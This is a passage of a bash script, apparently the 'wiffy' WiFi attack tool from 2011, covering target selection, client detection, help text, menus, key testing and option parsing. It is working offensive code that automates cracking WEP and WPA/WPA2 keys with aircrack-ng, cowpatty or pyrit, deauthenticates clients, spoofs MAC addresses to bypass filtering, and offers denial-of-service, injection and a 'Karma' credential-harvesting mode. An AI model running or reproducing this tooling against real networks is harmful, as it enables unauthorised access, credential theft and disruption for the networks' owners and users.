                  if [[ "$REPLY" =~ ^[Ww]$ ]]  && [ "$wpaMethod" != "wordlist" ]; then wpaMethod="wordlist"; break
                  elif [[ "$REPLY" =~ ^[Bb]$ ]] && [ "$wpaMethod" != "brute" ]; then wpaMethod="brute"; break; fi
               fi
               if [[ "$REPLY" =~ ^[Oo]$ ]]; then crackMethod="online"; break
               elif [[ "$REPLY" =~ ^[Ff]$ ]]; then crackMethod="offline"; break; fi
            elif [ "$attackMethod" == "clone" ]; then
               if [[ "$REPLY" =~ ^[Mm]$ ]] && [ "$attackMethod" == "clone" ]; then id="manual"; break 3; fi
            fi

            if [[ "$REPLY" =~ ^[Ss]$ ]]; then essid=""; bssid=""; id=""; encryption=""; client=""; break 2
            elif [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu
            elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "$((i+1))" ]; then id="$(($REPLY-1))"; break 3
            elif [ $(echo $REPLY | tr -dc '[:digit:]') ] && ([ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$i" ]); then display error "Incorrect number" 1>&2
            else display error "Bad input" 1>&2; fi
         done
      done
   done

   if [ "$id" == "manual" ]; then
      echo -ne "\e[00;33m[~]\e[00m "; read -p "ESSID?: "; essid="$REPLY"
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "BSSID?: ";
         if  [ $(echo $REPLY | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ]; then bssid="$REPLY"; break; fi
         display error "Bad input" 1>&2
      done
      while true; do
         echo -ne "\e[00;33m[~]\e[00m "; read -p "Channel?: ";
         if [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "13" ]; then channel="$REPLY"; break; fi
         display error "Bad input" 1>&2
      done
      if [ "$mode" == "crack" ]; then
         echo -e "1.) WEP\n2.) WPA (TKIP)\n3.) WPA (CCMP)\n4.) WPA2 (TKIP)\n5.) WPA2 (CCMP)"
         while true; do
            echo -ne "\e[00;33m[~]\e[00m "; read -p "Encryption?: "; channel="$REPLY"
            if [ "$REPLY" -gt "0" ] && [ "$REPLY" -lt "6" ]; then encryption="$REPLY"; break; fi
         done
         if [ "$REPLY" = "1" ]; then encryption="WEP"
         elif [ "$REPLY" = "2" ]; then encryption="WPA (TKIP)"
         elif [ "$REPLY" = "3" ]; then encryption="WPA (CCMP)"
         elif [ "$REPLY" = "4" ]; then encryption="WPA2(TKIP)"
         elif [ "$REPLY" = "5" ]; then encryption="WPA2(CCMP)"; fi
      fi
   elif [ "$crackMethod" == "offline" ]; then
      pathCap="${cap[$((REPLY-1))]}"
   elif [ "$id" == "WEP" ] || [ "$id" == "WPA" ] || [ "$id" == "all" ]; then # Array (aka "All")
      index="0"
      for ((i=0; i<${#apEncr[@]}; i++)); do
         if [ "$id" == "all" ] && ( [ "${apEncr[$i]}" == "WEP" ] || [[ "${apEncr[$i]}" == *WPA* ]] ); then # WEP AND WPA/2
            essid[${index}]="${apESSID[$i]}"
            bssid[${index}]="${apBSSID[$i]}"
            channel[${index}]="${apChannel[$i]}"
            encryption[${index}]="${apEncr[$i]}"
            index=$((index+1))
         elif [[ "${apEncr[$i]}" == *$id* ]]; then   # WEP OR WPA/2
            essid[${index}]="${apESSID[$i]}"
            bssid[${index}]="${apBSSID[$i]}"
            channel[${index}]="${apChannel[$i]}"
            encryption[${index}]="${apEncr[$i]}"
            index=$((index+1))
         fi
      done
   else   # Single
      if [ "$attackMethod" == "apless" ]; then
         if [ "${clientESSID[$id]}" ]; then essid="${clientESSID[$id]}"; elif [ "$essid" ]; then essid="essid"; else essid="WiFi"; fi
         if [ "${clientBSSID[$id]}" ]; then bssid="${clientBSSID[$id]}"; else bssid="$mac"; fi
         if [ "${clientChannel[$id]}" ]; then channel="${clientChannel[$id]}"; else channel="1"; fi
         if [ "${clientEncr[$id]}" ] && [ "${clientEncr[$id]}" != "???" ]; then ="${clientEncr[$id]}"; else encryption="WEP"; fi
      else essid="${apESSID[$id]}"; bssid="${apBSSID[$id]}"; channel="${apChannel[$id]}"; encryption="${apEncr[$id]}"; fi
      if [ -z "$essid" ]; then essid="WiFi"; fi                                            # Fail safes
      if [ -z "$bssid" ] || [[ "$bssid" == *"not associated"* ]]; then bssid="$mac"; fi
      if [ -z "$channel" ] || [ "$channel" -lt "1" ] || [ "$channel" -gt "12" ]; then channel="1"; fi
      if [ -z "$encryption" ] || [ "$encryption" == "???" ]; then encryption="WEP"; fi
   fi

   #if [ "$displayMore" == "true" ]; then
   #   display info "             mode=$mode"
   #   display info "               id=$id" #manual all apless
   #   display info "     attackMethod=$attackMethod"
   #fi

   client=""; stage="findAP"
}
function findClient() { #findClient #"$essid" $bssid "$encryption"
   if [ "$debug" == "true" ]; then echo -e "findClient~$@"; fi
   stage="findClient"; client=""; error="free"; _essid="$1"
   if [ -z "$2" ] || [ -z "$3" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "findClient Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: findClient (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#

   display action "Detecting: Client(s)"
   for ((i=0; i<$timeClient; i++)); do
      if [ -e "$(pwd)/tmp/wiffy-01.kismet.netxml" ]; then break; fi
      sleep 1
      if [ "$i" == "$timeClient" ]; then display error "Something went wrong )=   [11]" 1>&2; fi
   done

   attack "DeAuth" "$_essid" "$2" # Helping "kick", for idle client(s)
   if [ "$3" == "WEP" ] || [ "$3" == "N/A" ] || ([[ "$3" == *WPA* ]] && [ "$timeClient" != "0" ]); then # N/A = For MAC filtering
      for ((i=0; i<$timeClient; i++)); do
         echo -ne "\r\E[K\e[01;33m[i]\e[00m $((timeClient-i)) seconds..."
         sleep 1
      done
      echo -ne "\r\E[K"  #Blank countdown
      client=( $(grep "client-mac" "$(pwd)/tmp/wiffy-01.kismet.netxml" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') )
   elif [[ "$3" == *WPA* ]] && [ "$timeClient" == "0" ]; then while [ -z "$client" ]; do client=( $(grep "client-mac" "$(pwd)/tmp/wiffy-01.kismet.netxml" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') ); done; fi

   if [ -z "$_essid" ] && [ "$3" ]; then # Hidden SSID
      essid=$(grep "<essid cloaked=\"false\">" "$(pwd)/tmp/wiffy-01.kismet.netxml" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
      if [ "$essid" ] && [ "$displayMore" == "true" ]; then display more "*hidden* ESSID=$essid"; fi
   fi
   if [ -z "$_essid" ] && [ "$3" ] && [ "$mode" != "dos" ]; then
      echo -ne "\r\E[K\e[01;31m[!]\e[00m Timed out. Couldn't detect SSID. Try editing and increase \"timeAP\"\n" 1>&2
      action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"
      interrupt   # Returns to main menu
   elif [ -z "$client" ]; then
      if [[ "$3" == *WPA* ]] && [ "$mode" != "dos" ]; then
         action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"
         display error "Timed out. Couldn't detect any clients conencted to \"$_essid\". Try editing and increase \"timeClient\"" 1>&2
         stage="...NEXT"
      fi
      client="clientless"
   elif [ "$client" ] && [ "$macMode" == "client" ]; then
      if [ ${#client[@]} -gt "1" ]; then
         attack "mac" "blank" "$monitorInterface" "${client[1]}" # MAC Filtering
         #unset client[1]
      fi
   fi

   if [ -z "$client" ] && [ "$macMode" == "client" ]; then # Fail safe;) *No clients to clone...so change our mac to fakeMAC
      attack "mac" "blank" "$monitorInterface" "$fakeMac"
   fi

   if [ "$displayMore" == "true" ] && [ "$mode" == "crack" ] && [ "$stage" == "findClient" ]; then
      if [ "$client" == "clientless" ]; then echo -ne "\r\E[K\e[01;33m[i]\e[00m Switching to: Clientless mode\n"
      else for targets in "${client[@]}"; do echo -ne "\r\E[K\e[01;33m[i]\e[00m client=$targets\n"; done; fi
   fi

   return 0
}
function help() { #help
   if [ "$debug" == "true" ]; then echo -e "help~$@"; fi
   #----------------------------------------------------------------------------------------------#
   echo "(C)opyright 2011 g0tmi1k ~ http://g0tmi1k.blogspot.com

 Usage: bash wiffy.sh -i [interface] -t [interface] -m [crack/dos/inject/karma/decode/table] -e [ESSID] -b [MAC]
              -p [wordslist/brute/rainbow] -a [aircrack-ng/cowpatty/pyrit] -w [/path/to/]
              (-z [random/set/false] / -s [MAC]) -x -k -o [/path/to/folder/] -q -d (-v / -V) ([-u] [-?])


 Options:
   -i [interface]                     ---  Internet Interface e.g. $interface
   -t [interface]                     ---  Monitor Interface e.g. $monitorInterface

   -m [crack/dos/inject/decode/table] ---  Mode. e.g. $mode

   -e [ESSID]                         ---  ESSID (WiFi Name) e.g. Linksys
   -b [MAC]                           ---  BSSID (AP MAC) e.g. 01:23:45:67:89:AB

   -p [wordslist/brute/rainbow]       ---  Use a pre-made wordlist or hash table or brute force e.g. $wpaMethod
   -a [aircrack-ng/cowpatty/pyrit]    ---  Which software to use to crack WPA/WPA2 e.g. $wpaSoftware

   -w [/path/to/]                     ---  Path to Wordlist (file or folder) e.g. $wordlist

   -z [random/set/false]              ---  Change interface's MAC Address e.g. $macMode
   -s [MAC]                           ---  Use this MAC Address e.g. $fakeMac

   -x                                 ---  Connect to network afterwords

   -k                                 ---  Keep capture cap files
   -o [/path/to/folder/]              ---  Output folder for the cap files

   -q                                 ---  Quite Mode - doesn't use xterm therefore only one output window
   -d                                 ---  Diagnostics      (Creates output file, $logFile)
   -v                                 ---  Verbose          (Displays more)
   -V                                 ---  (Higher) Verbose (Displays more + shows commands)

   -u                                 ---  Checks for an update
   -?                                 ---  This screen


 Example:
   bash wiffy.sh
   bash wiffy.sh -i wlan1 -e Linksys -w /pentest/passwords/wordlists/wpa.lst -x -v
   bash wiffy.sh -i wlan1 -b 00:11:22:33:44:55 -p brute
   bash wiffy.sh -m dos -V


 Modes:
    -Crack
       > Uses diffent attack styles (AP and AP-Less/CloneAP)
       > As well as different attack methods methods (ARPReplay, Fragment, ChopChop, Interactive)
       > To support both WEP and WPA/WPA2 encrypted networks.
    -DoS
       > Blocks access to the Access point to everyone or specific clients
    -Inject
       > Insert data into the wireless network
    -Karma
       > A method of grabbing user's credentials.
    -DeCode
       > Converts encrypted traffic
    -Table
       > Creates rainbow/hash tables which can be used to speed up the cracking process.


 Known issues:
    -Doesn't detect any/my wireless network
       > Unplug WiFi device, wait, re-plug (Common VM issue)
       > Increase \"timeAP\" value
       > Driver issue - Use a different WiFi device
       > You're too close/far away to the AP
       > Re-run the script
       > Don't run from a virtual machine

    -WEP
       > Doesn't detect the client
          + Re-run the script
       > IVs doesn't increase
          + WiFi card isn't support (Re-run the script with diagnostics enabled)
          + DeAuth didn't work
          + Use a different router/client/attack
    -WPA
       > You can ONLY crack WPA when:
          + The ESSID is known
          + There is a connected client
          + The WiFi key is in the word-list

    -Slow
       > Try a different attack
       > Try doing it ...manually!

    -\"connect\" doesn't work
       > Network doesn't have a DHCP server

    -\"airpwn\" doesn't install
       > Good chance this is because your repository doesn't have everything it needs.
            Try adding BackTrack's. See: http://sun.backtrack-linux.org/

    -\"airpwn\" doesn't detect my network
       > Only works on Open OR WEP networks. (NOT WPA/WPA2)
       > Increase \"timeAP\" value
"
   s="\e[01;35m"; n="\e[00m"
   echo -e "[-] Edit ["$s"W"$n"]iffy, or e["$s"x"$n"]it"
   while true;  do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "Select option: "
      if [[ "$REPLY" =~ ^[Xx]$ ]]; then break
      elif [[ "$REPLY" =~ ^[Ww]$ ]]; then editSettings "$(pwd)/wiffy.sh"; display info "Please re-run wiffy"; break; fi
   done
   exit 1
}
function interrupt() { #interrupt
   #if [ "$mode" == "crack" ] && [ "$attackMethod" == "ap" ] && [ "$encryption" == "WEP" ] && ([ "$stage" == "findClient" ] || [ "$stage" == "moveCap" ]); then
   #   echo #Blank line
   #   echo -ne "\e[00;33m[~]\e[00m "; read -p "[N]ext attack, re[d]ect clients and restart attack, or return to scan [m]enu?: "
   #   if [[ "$REPLY" =~ ^[Nn]$ ]]; then   command=$(pgrep aireplay-ng | while read line; do echo -n "$line "; done | awk '{print}'); if [ -n "$command" ]; then kill $command; fi; capture "$_essid" "$_channel"; break
   #   elif [[ "$REPLY" =~ ^[Dn]$ ]]; then command=$(pgrep aireplay-ng | while read line; do echo -n "$line "; done | awk '{print}'); if [ -n "$command" ]; then kill $command; fi; findClient "$_essid" "$_bssid" "$_encryption"; break
   #   else action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"; stage="interrupt"; essid=""; bssid=""; id=""; encryption=""; client=""; break; fi
   #el
   if [ "$mode" == "crack" ] && [ "$stage" != "setup" ] && [ "$stage" != "capture" ] && [ "$stage" != "menu" ] && [ "$stage" != "done" ]; then echo; action "Killing programs" "killall aircrack-ng cowpatty pyrit airbase-ng airodump-ng xterm"; stage="interrupt"; essid=""; bssid=""; id=""; encryption=""; client=""; display info "Returning to scan menu"; break
   elif [ "$mode" == "dos" ]; then break
   elif [ "$mode" == "inject" ]; then break
   elif [ "$mode" == "karma" ]; then break
   elif [ "$stage" == "cleanUp" ]; then echo #Blank line
   else cleanUp interrupt; fi # Default
}
function mainMenu() { #mainMenu
   s="\e[01;35m"; n="\e[00m"
echo -e "                 ___       _______ ________________
                 __ |     / /___(_)___  __/___  __/_____  __
                 __ | /| / / __  / __  /_  __  /_  __  / / /
                 __ |/ |/ /  _  /  _  __/  _  __/  _  /_/ /
                 ____/|__/   /_/   /_/     /_/     _\__, /
                                                   /____/ v$version
----------------------------"$s"Main Menu"$n"-------------------------------
[-] ["$s"C"$n"]rack     --- Crack WiFi network key(s)
[-] ["$s"D"$n"]oS       --- Denial-of-service to a certain AP and/or client(s)
[-] D["$s"e"$n"]code    --- Decrypts pre-captured data
[-] ["$s"I"$n"]nject    --- Inject data into a network
[-] ["$s"K"$n"]arma     --- Harvest data
[-] ["$s"T"$n"]able     --- Create rainbow tables
[-] ["$s"W"$n"]ordlist  --- Manage wordlists

[-] Edit default ["$s"s"$n"]ettings
[-] Auto-["$s"U"$n"]pdate
[-] ["$s"H"$n"]elp"
   while true; do
      echo -ne "\e[00;33m[~]\e[00m "; read -p "What would you like to do today?: "
      if [[ "$REPLY" =~ ^[Cc]$ ]]; then mode="crack"; break
      elif [[ "$REPLY" =~ ^[Dd]$ ]]; then mode="dos"; break
      elif [[ "$REPLY" =~ ^[Ee]$ ]]; then mode="decode"; break
      elif [[ "$REPLY" =~ ^[Ii]$ ]]; then mode="inject"; break
      elif [[ "$REPLY" =~ ^[Kk]$ ]]; then mode="karma"; break
      elif [[ "$REPLY" =~ ^[Tt]$ ]]; then mode="table"; break
      elif [[ "$REPLY" =~ ^[Ww]$ ]]; then mode="wordlist"; break
      elif [[ "$REPLY" =~ ^[Ss]$ ]]; then editSettings "$(pwd)/wiffy.sh"; display info "Please re-run wiffy"; exit
      elif [[ "$REPLY" =~ ^[Uu]$ ]]; then update
      elif [[ "$REPLY" =~ ^[Hh]$ ]]; then help
      elif [[ "$REPLY" =~ ^[Xx]$ ]]; then cleanUp menu; fi
done;
}
function moveCap() { #moveCap "$essid" $bssid "$encryption"
   if [ "$debug" == "true" ]; then echo -e "moveCap~$@"; fi
   error="free"; command=""
   if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then error="1"
   elif [[ "$3" != *WEP* ]] && [[ "$3" != *WPA* ]]; then error="2"; fi

   if [ "$error" != "free" ]; then
      display error "moveCap Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: moveCap (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#

   if [[ "$3" == *WEP* ]]; then command="WEP-"
   elif [[ "$3" == *WPA* ]]; then command="WPA-"; fi
   command="$command${1//[^a-zA-Z0-9_]}-$2"; pathCap="$(pwd)/tmp/wiffy-01.cap"

   if ([[ "$3" == *WPA* ]] || [ "$stage" == "done" ]) && [ "$keepCap" == "true" ]; then
      pathCap="$capFolder/$command.cap"
      if [ "$displayMore" == "true" ] && [[ "$3" == *WPA* ]]; then display more "Moving handshake: $pathCap"
      elif [ "$displayMore" == "true" ] && [ "$stage" != "attack" ]; then display more "Moving capture file: $pathCap"; fi
      action "Moving cap" "mv -f \"$(pwd)/tmp/wiffy-01.cap\" \"$pathCap\""
   fi
   if [ "$stage" != "done" ]; then stage="moveCap"; fi
   return 0
}
function setup() { #setup #"$essid" $bssid "$encryption" $channel
   if [ "$debug" == "true" ]; then echo -e "setup~$@"; fi
   error="free"; stage="setup"
   if [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]; then error="1"; fi
   if [ "$4" ] && [ -z $(echo "$4" | grep -E "^[0-9]+$") ]; then error="2"; fi

   if [ "$error" != "free" ]; then
      display error "setup Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: setup (Error code: $error): $1, $2, $3, $4" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#

   if [ "$diagnostics" == "true" ]; then
      echo "            essid=$1
     bssid=$2
encryption=$3
   channel=$4" >> $logFile
   fi
   if [ "$debug" == "true" ] || [ "$verbose" != "0" ]; then
      display info "     essid=$1"
      display info "     bssid=$2"
      display info "encryption=$3"
      display info "   channel=$4"
   fi

   if [ "$displayMore" == "true" ]; then display more "Configuring: Wireless card"; fi
   action "Changing Channel" "iwconfig $monitorInterface channel $4" "true"
   return 0
}
function checkDB() { #checkDB #"$essid" $bssid "$encryption" #"$message"
   if [ "$debug" == "true" ]; then echo -e "checkDB~$@"; fi
   error="free"; stage="checkDB"
   if [ -z "$2" ] || [ -z "$3" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "checkDB Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: checkDB (Error code: $error): $1, $2, $3" >> $logFile
      return 0
   fi
   #----------------------------------------------------------------------------------------------#
   if [ -e "wiffy.keys" ]; then   # We have a database
      if [[ "$3" == *WPA2* ]]; then encTMP="WPA2"
      elif [[ "$3" == *WPA* ]]; then encTMP="WPA"
      else encTMP="$3"; fi
      if [ -z "$1" ]; then # Hidden SSID
         tmp=$(cat wiffy.keys | sed -n "/BSSID: $2/, +3p" | tail -5)
         key=$(echo $tmp | grep "Encryption: $encTMP" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/ Client: .*//p')
         if [ "$key" ]; then
            command=$(grep -n "BSSID: $2" wiffy.keys | cut -f1 -d: | tail -1)
            _essid=$(cat wiffy.keys | sed -n $((command-1))p | sed -n 's/.*ESSID: //p')
            if [ "$_essid" ]; then display info "ESSID *may* be: $_essid"; fi
         fi
      else
         _essid="$1"
         tmp=$(cat wiffy.keys | sed -n "/ESSID: $_essid/, +4p" | tail -5)
         key=$(echo $tmp | grep "BSSID: $2" -q && echo $tmp | grep "Encryption: $encTMP" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/ Client: .*//p')
      fi
      if [ "$_essid" ] && [ "$key" ] && [ "$4" ]; then
         display info "$_essid's key *may* be: $key"
         if [ "$connect" == "true" ]; then
            client=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Client: //p')
            connect "$_essid" "$bssid" "$key" "$client"
            if [ "$stage" == "connected" ]; then cleanUp clean; fi
         fi
      fi
   fi
   return 1
}
function testKey() { #testKey $bssid "$encryption" "$key"
   if [ "$debug" == "true" ]; then echo -e "testKey~$@"; fi
   error="free"
   if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then error="1"; fi

   if [ "$error" != "free" ]; then
      display error "testKey Error code: $error" 1>&2
      echo -e "---------------------------------------------------------------------------------------------\nERROR: testKey (Error code: $error): $1, $2, $3" >> $logFile
      return 1
   fi
   #----------------------------------------------------------------------------------------------#
   if [ "$2" == "WEP" ]; then
      command=$(grep "$1" "$(pwd)/tmp/wiffy-01.csv" | awk -F "," '{print $11}' | sed 's/ [ ]*//' | head -1)
      if [ "$command" ] && [ "$command" -gt "4" ]; then
         command="echo '$key' | sed 's/../&:/g;s/:$//' > \"$(pwd)/tmp/wiffy.tmp\"; aircrack-ng \"$pathCap\" -b $1 -l \"$(pwd)/tmp/wiffy.key\" -w h:\"$(pwd)/tmp/wiffy.tmp\" -a 1 -K"
         tmp=$((${#key})) # Lenght of key
         if [ "$tmp" -lt "11" ]; then command="$command -n 64"
         elif [ "$tmp" -lt "14" ]; then command="$command -n 128"
         elif [ "$tmp" -lt "17" ]; then command="$command -n 152"
         elif [ "$tmp" -lt "30" ]; then command="$command -n 256"; fi
         action "aircrack-ng" "$command"
      else display error "WEP: Not enough IVs" 1>&2; return  0; fi #Therefore they don't get effort with whats coming later ( key="")
   elif [[ "$2" == *WPA* ]]; then action "aircrack-ng" "echo '$key' > \"$(pwd)/tmp/wiffy.tmp\"; aircrack-ng \"$pathCap\" -b $1 -l \"$(pwd)/tmp/wiffy.key\" -w \"$(pwd)/tmp/wiffy.tmp\" -a 2"; fi
   if [ -e "$(pwd)/tmp/wiffy.key" ]; then stage="done"
   else key=""; fi # WEP - We have enought IV (over 4), or Handshake - therefore as this file wasn't made - its the wrong key. Blank it.
   return 0
}
function update() { #update #doUpdate
   if [ "$debug" == "true" ]; then echo -e "update~$@"; fi
   #----------------------------------------------------------------------------------------------#
   display action "Checking for an update"
   command=$(wget -qO- "http://g0tmi1k.googlecode.com/svn/trunk/" | grep "<title>g0tmi1k - Revision" | awk -F " " '{split ($4,A,":"); print A[1]}')
   if [ "$command" ] && [ "$command" -gt "$svn" ]; then
      if [ "$1" ]; then
         display info "Updating"
         wget -q -N "http://g0tmi1k.googlecode.com/svn/trunk/wiffy/wiffy.sh"
         display info "Updated! =)"
      else display info "Update available! *Might* be worth updating (bash wiffy.sh -u)"; fi
   elif [ "$command" ]; then display info "You're using the latest version. =)"
   else display info "No internet connection"; fi
   if [ "$1" ]; then
      echo
      exit 2
   fi
}


#---Main---------------------------------------------------------------------------------------#
echo -e "\e[01;36m[*]\e[00m wiffy v$version"

#----------------------------------------------------------------------------------------------#
if [ "$(id -u)" != "0" ]; then display error "Run as root" 1>&2; cleanUp nonuser; fi
stage="setup"

#----------------------------------------------------------------------------------------------#
while getopts "i:t:m:e:b:p:a:w:z:s:xko:qdvVuh?" OPTIONS; do
   case ${OPTIONS} in
      i ) interface=$OPTARG;;
      t ) monitorInterface=$OPTARG;;
      m ) mode=$OPTARG;;
      e ) essid=$OPTARG;;
      b ) bssid=$OPTARG;;
      p ) wpaMethod=$OPTARG;;
      a ) wpaSoftware=$OPTARG;;
      w ) wordlist=$OPTARG;;
      z ) macMode=$OPTARG;;
      s ) fakeMac=$OPTARG;;
      x ) connect="true";;
      k ) keepCap="true";;
      o ) capFolder=$OPTARG;;
      d ) diagnostics="true";;
      q ) quiet="true";;
      v ) verbose="1";;
      V ) verbose="2";;
      u ) update "do";;
      h ) help; exit;;
      ? ) help; exit;;
   esac
done

#----------------------------------------------------------------------------------------------#
if [ "$verbose" != "0" ] || [ "$diagnostics" == "true" ] || [ "$debug" == "true" ]; then
   displayMore="true"
   if [ "$debug" == "true" ]; then display info "Debug mode: Enabled"; fi
   if [ "$diagnostics" == "true" ]; then
      display diag "Diagnostics mode"
      echo -e "wiffy v$version\nStart @ $(date)" > $logFile
      echo "wiffy.sh" $* >> $logFile
   fi
fi
if [ "$quiet" == "true" ]; then display info "Quite mode: Enabled"; fi

#----------------------------------------------------------------------------------------------#
if [ -z "$mode" ] || [ "$mode" == " " ]; then mainMenu; fi

#----------------------------------------------------------------------------------------------#
display action "Analyzing: Environment"

#----------------------------------------------------------------------------------------------#
# Fixes: ~/ issue
#capFolder="$(readlink -m \"$capFolder\")"
#decodeFolder="$(readlink -m \"$decodeFolder\")"
#wordlist=$(readlink -m "$wordlist")
#capFolder="$(cd \"$capFolder\" 2> /dev/null && pwd)"
#decodeFolder="$(cd \"$decodeFolder\" 2> /dev/null && pwd)"
#wordlist="$(cd \"$wordlist\" 2> /dev/null && pwd)"

#----------------------------------------------------------------------------------------------#
# *** SCAN FOR INFITERFACE?
if [ -z "$interface" ]; then display error "interface can't be blank" 1>&2; cleanUp; fi
if [ "$mode" != "crack" ] && [ "$mode" != "dos" ] && [ "$mode" != "inject" ] && [ "$mode" != "karma" ] && [ "$mode" != "decode" ] && [ "$mode" != "table" ] && [ "$mode" != "wordlist" ]; then display error "mode ($mode) isn't correct" 1>&2; mainMenu; fi

if [ "$macMode" != "random" ] && [ "$macMode" != "set" ] && [ "$macMode" != "false" ] && [ "$macMode" != "client" ]; then display error "macMode ($macMode) isn't correct" 1>&2; macMode="false"; fi
if [ "$macMode" == "set" ] && ([ -z "$fakeMac" ] || [ -z $(echo $fakeMac | egrep "^([0-9a-fA-F]{2}\:){5}[0-9a-fA-F]{2}$") ]); then display error "fakeMac ($fakeMac) isn't correct" 1>&2; macMode="false"; fi
if [ "$mode" == "crack" ]; then
   if [ "$wpaMethod" != "wordlist" ] && [ "$wpaMethod" != "brute" ]  && [ "$wpaMethod" != "rainbow" ]; then display error "wpaMethod ($wpaMethod) isn't correct" 1>&2; wpaMethod="wordlist"; fi
   if [ "$wpaSoftware" != "aircrack-ng" ] && [ "$wpaSoftware" != "cowpatty" ]  && [ "$wpaSoftware" != "pyrit" ]; then display error "wpaSoftware ($wpaSoftware) isn't correct" 1>&2; wpaSoftware="aircrack-ng"; fi
   if [ "$wpaMethod" == "wordlist" ] && [ -d "$wordlist" ] && [ ! "$(find $wordlist -maxdepth 1 -type f)" ]; then display error "There isn't any wordlists in: $wordlist" 1>&2; cleanUp; fi
   if [ "$wpaMethod" == "wordlist" ] && [ ! -e "$wordlist" ]; then display error "There isn't a wordlist located at: $wordlist" 1>&2; display info "Switching to: brute attack"; wpaMethod="brute"; fi
   if [ -z "$(ls $wordlist 2> /dev/null)" ] && [ "$wpaMethod" == "wordlist" ]; then display error "There isn't any files in the wordlist folder ($wordlist)." 1>&2; display info "Switching to: brute attack"; wpaMethod="brute"; fi
   if [ "$connect" != "true" ] && [ "$connect" != "false" ]; then display error "connect ($connect) isn't correct" 1>&2; connect="false"; fi
   if [ "$keepCap" != "true" ] && [ "$keepCap" != "false" ]; then display error "keepCap ($keepCap) isn't correct" 1>&2; keepCap="false"; fi
   if [ -z "$capFolder" ]; then display error "capFolder ($capFolder) isn't correct" 1>&2; capFolder="$(pwd)/cap/"; fi
   if [ "$benchmark" != "true" ] && [ "$benchmark" != "false" ]; then display error "benchmark ($benchmark) isn't correct" 1>&2; benchmark="false"; fi
elif [ "$mode" == "wordlist" ]; then
   if [ -d "$wordlist" ] && [ ! "$(find $wordlist -maxdepth 1 -type f)" ]; then display error "There isn't any wordlists in: $wordlist" 1>&2; cleanUp; fi
   if [ ! -e "$wordlist" ] ; then display error "There isn't a wordlist located at: $wordlist" 1>&2; cleanUp; fi
fi

if [ "$mode" == "decode" ] && [ ! -e "$decodeFolder" ]; then display error "There isn't a folder at: $decodeFolder" 1>&2; decodeFolder="$(pwd)/caps"; fi
if [ "$quiet" != "true" ] && [ "$quiet" != "false" ]; then display error "quiet ($quiet) isn't correct" 1>&2; quiet="false"; fi
if [ "$verbose" != "0" ] && [ "$verbose" != "1" ] && [ "$verbose" != "2" ]; then display error "verbose ($verbose) isn't correct" 1>&2; verbose="0"; fi
if [ "$debug" != "true" ] && [ "$debug" != "false" ]; then display error "debug ($debug) isn't correct" 1>&2; debug="true"; fi
if [ "$diagnostics" != "true" ] && [ "$diagnostics" != "false" ]; then display error "diagnostics ($diagnostics) isn't correct" 1>&2; diagnostics="false"; fi
if [ "$diagnostics" == "true" ] && [ -z "$logFile" ]; then display error "logFile ($logFile) isn't correct" 1>&2; logFile="wiffy.log"; fi
if [ -z "$timeAP" ] || [ "$timeAP" -lt "1" ]; then display error "timeAP ($timeAP) isn't correct" 1>&2; timeAP="20"; fi
if [ "$timeAP" -lt "5" ]; then display error "timeAP ($timeAP) is a little low" 1>&2; fi
if [ -z "$timeClient" ] || [ "$timeClient" -lt "0" ]; then display error "timeClient ($timeClient) isn't correct" 1>&2; timeClient="10"; fi # Allow to wait forever
if [ "$timeClient" -gt "1" ] && [ "$timeClient" -lt "5" ]; then display error "timeClient ($timeClient) is a little low" 1>&2; fi
if [ -z "$timeWEP" ] || [ "$timeWEP" -lt "1" ]; then display error "timeWEP ($timeWEP) isn't correct" 1>&2; timeWEP="180"; fi
if [ "$timeWEP" -lt "30" ]; then display error "timeWEP ($timeWEP) is a little low" 1>&2; fi
if [ -z "$loopWPA" ] || [ "$loopWPA" -lt "0" ]; then display error "loopWPA ($loopWPA) isn't correct" 1>&2; loopWPA="3"; fi # Allow to wait forever

#----------------------------------------------------------------------------------------------#
capFolder="${capFolder%/}"
decodeFolder="${decodeFolder%/}/*.cap"
os=$(cat /etc/*release | tail -1 | awk -F " " '{print $1}')
if [ "$os" == "Fedora" ]; then installPackage="yum -y install" #$(ps < /var/run/yum.pid) | kill $(pgrep yum | while read line; do echo -n \"$line \"; done);
else installPackage="apt-get -y install"; fi

#----------------------------------------------------------------------------------------------#
if [ "$mode" != "decode" ] && [ "$mode" != "table" ] && [ "$mode" != "wordlist" ]; then
   command=$(iwconfig $interface 2> /dev/null | grep "802.11" | cut -d " " -f1)
   if [ -z "$command" ]; then
      display error "'$interface' isn't a wireless interface"
      command=$(iwconfig 2> /dev/null | grep "802.11" | cut -d " " -f1 | head -1)
      if [ "$command" ]; then
         interface="$command"
         display info "Found: $interface"
